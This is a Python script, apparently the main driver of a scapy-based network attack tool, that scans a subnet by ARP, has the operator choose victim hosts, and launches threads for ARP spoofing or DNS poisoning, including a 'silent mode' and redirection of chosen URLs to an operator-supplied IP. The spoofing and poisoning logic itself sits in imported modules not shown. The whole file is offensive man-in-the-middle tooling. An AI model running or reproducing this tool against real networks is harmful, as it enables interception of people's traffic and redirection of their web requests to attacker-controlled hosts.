import sys
import threading
from scapy.all import *
from ArpSpoofing import ArpSpoofing
from DnsPoisoning import DnsPoisoning
from SilentDnsPoisoning import SilentDnsPoisoning

if __name__ == "__main__":
    #global variables
    arguments = sys.argv
    #argReq = 6
    interface = "enp0s3"
    arpSpoof = None
    dnsPoison = None
    target1 = []
    target1MAC = []
    target2 = []
    target2MAC = []
    urlList = []
    oneWay = None
    silent = None
    hostToSpoof = None
    ipToSendTo = None
    url = None

    #Takes the command like argument and stores it
    modeOfAttack = arguments[1]
    timeSleep = float(arguments[2])

    print("We will start scanning the network.")
    ips = raw_input("Enter range of IPs to scan for: (e.g 192.168.56.0/24): ")
    conf.verb = 0
    ans, unans = srp(Ether(dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2, iface=interface, inter=0.1)
    counter = 0
    ipList = []
    macList = []
    for snt, recv in ans:
        print("index: {} IP: {} MAC: {}".format(counter,recv[ARP].psrc, recv[ARP].hwsrc))
        ipList.append(recv[ARP].psrc)
        macList.append(recv[ARP].hwsrc)
        counter += 1
    index = ""
    while index != "no":
        index = raw_input("Enter the index of the IP to add to Target 1 or no if you are done adding IPs: ")
        if index != "no":
            intIndex = int(index)
            target1.append(ipList[intIndex])
            target1MAC.append(macList[intIndex])
            index = raw_input("IP added, do you want to select more IP addresses? Write yes or no: ")
    index2 = ""
    while index2 != "no":
        index2 = raw_input("Enter the index of the IP to add to Target 2 or no if you are done adding IPs: ")
        if index2 != "no":
            intIndex2 = int(index2)
            target2.append(ipList[intIndex2])
            target2MAC.append(macList[intIndex2])
            index2 = raw_input("IP added, do you want to select more IP addresses? Write yes or no: ")


    if modeOfAttack == "arp":
        oneWayQuestion = raw_input("Only poison one-way? Write yes or no: ")
        if oneWayQuestion == "yes":
            oneWay = True
        elif oneWayQuestion == "no":
            oneWay = False
        silentQuestion = raw_input("Perform attack in silent mode? Write yes or no: ")
        if silentQuestion == "yes":
            silent = True
        elif silentQuestion == "no":
            silent = False
    elif modeOfAttack == "dns":
        index2 = ""
        ipSendTo = raw_input("Please enter IP address to which the URL must go to: ")
        ipToSendTo = ipSendTo
        urlNext = "yes"
        while urlNext == "yes":
            newUrl = raw_input("Please enter the URL you want to DNS spoof: ")
            urlNext = raw_input("If you want to enter another URL type yes, otherwise type no: ")
            urlList.append(newUrl)
        silentQuestion = raw_input("Perform attack in silent mode? Write yes or no: ")
        if silentQuestion == "yes":
            silent = True
        elif silentQuestion == "no":
            silent = False
    else:
        print("Wrong mode of attack provided choose out of: arp or dns")
        sys.exit(1)

    if len(target1) == 0:
        print("You did not add any IP addresses to Target 1, exiting...")
        sys.exit(1)

    if len(target2) == 0:
        print("You did not add any IP addresses to Target 2, exiting...")
        sys.exit(1)

    if modeOfAttack == "arp":
        arpSpoofing = ArpSpoofing(interface)
        try:
            print("before thread")
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(target1, target2, target1MAC, target2MAC, oneWay, silent, timeSleep))
            arpSpoof.daemon = True
            arpSpoof.start()
            print("after thread")
        except:
            print("Thread arp failed to start")
    elif modeOfAttack == "dns":
        if silent:
            dnsPoisoning = SilentDnsPoisoning(interface)
            try:
                dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison,
                                             args=(target1, target2, target1MAC, target2MAC, urlList, ipToSendTo, timeSleep))
                dnsPoison.daemon = True
                dnsPoison.start()
            except:
                print("Thread dns failed to start")
        else:
            dnsPoisoning = DnsPoisoning(interface)
            try:
                dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison,
                                             args=(target1, target2, target1MAC, target2MAC, urlList, ipToSendTo))
                dnsPoison.daemon = True
                dnsPoison.start()
            except:
                print("Thread dns failed to start")


    else:
        print("Wrong mode of attack provided choose out of: arp, dns or all")
        sys.exit(1)

    if modeOfAttack == "arp":
        arpSpoof.join()
    elif modeOfAttack == "dns":
        dnsPoison.join()

    print("reached end of the main file")
